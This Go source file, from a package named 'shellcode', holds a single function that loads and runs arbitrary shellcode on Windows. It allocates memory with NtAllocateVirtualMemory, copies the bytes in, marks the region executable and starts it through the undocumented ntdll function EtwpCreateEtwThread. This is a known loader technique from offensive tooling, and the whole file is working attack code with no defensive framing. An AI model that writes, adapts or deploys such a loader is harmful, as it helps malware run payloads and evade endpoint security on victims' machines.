package shellcode

import (
	"unsafe"
	"golang.org/x/sys/windows"
)

func EtwpCreateEtwThread(shellcode []byte) error {
  ntdll := windows.NewLazyDLL("ntdll.dll")
  NtAllocateVirtualMemory := ntdll.NewProc("NtAllocateVirtualMemory")
  NtProtectVirtualMemory := ntdll.NewProc("NtProtectVirtualMemory")
	NtWaitForSingleObject := ntdll.NewProc("NtWaitForSingleObject")
	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
	EtwpCreateEtwThread := ntdll.NewProc("EtwpCreateEtwThread")

  var addr uintptr
  regionsize := uintptr(len(shellcode))

  r1, _, err := NtAllocateVirtualMemory.Call(^uintptr(0),  uintptr(unsafe.Pointer(&addr)), 0, uintptr(unsafe.Pointer(&regionsize)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if r1 != uintptr(windows.STATUS_SUCCESS) {
    return err
	}

	RtlCopyMemory.Call(addr, uintptr(unsafe.Pointer(&shellcode[0])), regionsize)

	oldProtect := windows.PAGE_READWRITE
  r2, _, err := NtProtectVirtualMemory.Call(^uintptr(0), uintptr(unsafe.Pointer(&addr)), uintptr(unsafe.Pointer(&regionsize)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
  if r2 != 0 {
    return err
  }

  thread, _, err := EtwpCreateEtwThread.Call(addr, uintptr(0))
  if thread == 0 {
    return err
  }

	r3, _, err := NtWaitForSingleObject.Call(thread, uintptr(0), 0xFFFFFFFF)
	if r3 != 0 {
    return err
	}

	return nil
}
